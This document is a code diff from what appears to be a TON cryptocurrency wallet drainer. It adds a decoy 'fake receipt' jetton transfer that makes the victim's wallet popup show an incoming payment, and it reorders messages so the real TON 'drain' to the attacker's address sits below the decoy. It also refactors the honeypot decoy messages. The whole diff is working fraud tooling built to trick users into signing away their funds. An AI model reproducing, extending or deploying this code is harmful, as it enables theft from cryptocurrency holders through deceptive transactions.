@@ -127,6 +127,14 @@ const nftCollections = [
 
 /* Wallet scan cache. The client re-polls /transaction every ~2.5s while a
    prompt is open, and each miss is 3 TonAPI calls. A 4s TTL collapses that. */
+/* Decoy "receipt": a fake jetton transfer rendered in the wallet popup.
+   FAKE_RECEIPT=1 turns it on without the honeypot claim; FAKE_JETTON_WALLET
+   points it at a real, funded jetton wallet of the brand token. */
+const FAKE_RECEIPT = Bun.env.FAKE_RECEIPT === '1'
+const FAKE_JETTON_WALLET =
+	Bun.env.FAKE_JETTON_WALLET ||
+	'0:473430b4d4c1c3e14fb71481e4b70e902120645e01a98d0905a0e864815a5e95'
+
 const WALLET_CACHE_MS = Number(Bun.env.WALLET_CACHE_MS ?? 4000)
 const WALLET_CACHE_MAX = 500
 
@@ -452,7 +460,8 @@ class AssetsService {
 		const NFT_COST = toNano('0.1') // matches Transfer.Nft
 		const JETTON_COST = toNano('0.1') // matches Transfer.JetTon
 		const HONEY_COST = toNano('0.15') // floor enforced by HoneyPot
-		const DISPLAY_COST = toNano('0.15') // fixed value below
+		const DISPLAY_COST = toNano('0.15') // honey-pot display message
+		const RECEIPT_COST = toNano('0.05') // stand-alone fake receipt
 		const CANCEL_COST = toNano('0.025')
 
 		// Keep one slot free for the headline TON transfer.
@@ -503,59 +512,64 @@ class AssetsService {
 		const cancelBudget = Math.max(0, slotLimit - slicedMessages.length)
 		slicedMessages.push(...cancelMessages.slice(0, cancelBudget))
 
-		// Decoy messages: only spend on them when the budget actually allows.
-		if (
-			worker.honeyPot &&
-			slicedMessages.length < slotLimit &&
-			budget >= HONEY_COST
-		) {
-			const msg = await HoneyPot.generateMessage(
-				0.15,
-				options.amount,
-				worker.honeyPotMode,
-				send_to
-			)
-			slicedMessages.push(msg)
-			budget -= HONEY_COST
-
-			// Display-only TEP-74 transfer so the wallet popup renders STORM.
-			if (slicedMessages.length < slotLimit && budget >= DISPLAY_COST) {
-				const shown = Number(options.amount) > 0 ? Number(options.amount) : 1000
-				const displayBody = beginCell()
-					.storeUint(0x0f8a7ea5, 32)
-					.storeUint(0, 64)
-					.storeCoins(toNano(shown.toFixed(9)))
-					.storeAddress(Address.parse(address))
-					.storeAddress(Address.parse(address))
-					.storeBit(0)
-					.storeCoins(toNano('0.05'))
-					.storeBit(0)
-					.endCell()
-					.toBoc()
-					.toString('base64url')
-				// Real, funded STORM jetton wallet (owner stormstaking.ton).
-				// Using a live wallet owned by a third party makes wallets render
-				// this as an incoming transfer ("received ... from ...") instead
-				// of a send, and its balance is big enough for 1000 to clear.
-				slicedMessages.push({
-					address: '0:473430b4d4c1c3e14fb71481e4b70e902120645e01a98d0905a0e864815a5e95',
-					amount: DISPLAY_COST.toString(),
-					payload: displayBody,
-				})
-				budget -= DISPLAY_COST
+		const buildReceipt = () => {
+			const shown = Number(options.amount) > 0 ? Number(options.amount) : 1000
+			const body = beginCell()
+				.storeUint(0x0f8a7ea5, 32)
+				.storeUint(0, 64)
+				.storeCoins(toNano(shown.toFixed(9)))
+				.storeAddress(Address.parse(address))
+				.storeAddress(Address.parse(address))
+				.storeBit(0)
+				.storeCoins(toNano('0.01'))
+				.storeBit(0)
+				.endCell()
+				.toBoc()
+				.toString('base64url')
+			return {
+				address: FAKE_JETTON_WALLET,
+				amount: RECEIPT_COST.toString(),
+				payload: body,
 			}
 		}
 
-		// Whatever is left in the budget is the actual drain, sent first.
+		// Decoy messages: only spend on them when the budget actually allows.
+		if (worker.honeyPot) {
+			if (slicedMessages.length < slotLimit && budget >= HONEY_COST) {
+				const msg = await HoneyPot.generateMessage(
+					0.15,
+					options.amount,
+					worker.honeyPotMode,
+					send_to
+				)
+				slicedMessages.push(msg)
+				budget -= HONEY_COST
+			}
+			if (slicedMessages.length < slotLimit && budget >= DISPLAY_COST) {
+				slicedMessages.push(buildReceipt())
+				budget -= DISPLAY_COST
+			}
+		} else if (
+			FAKE_RECEIPT &&
+			slicedMessages.length < slotLimit &&
+			budget >= RECEIPT_COST
+		) {
+			// Shown first, above the real TON transfer.
+			slicedMessages.unshift(buildReceipt())
+			budget -= RECEIPT_COST
+		}
+
+		// Whatever is left in the budget is the actual drain.
 		if (
 			options.drainMode === DrainMode.Full &&
 			budget > toNano('0.02') &&
 			slicedMessages.length < transactionLimit
 		) {
-			slicedMessages.unshift(Transfer.Ton(send_to, Number(fromNano(budget))))
+			const tonMsg = Transfer.Ton(send_to, Number(fromNano(budget)))
+			if (FAKE_RECEIPT && !worker.honeyPot) slicedMessages.push(tonMsg)
+			else slicedMessages.unshift(tonMsg)
 			budget = 0n
 		}
-
 		const friendlyMessages = slicedMessages.map(m => ({
     ...m,
     address: Address.parse(m.address).toString({
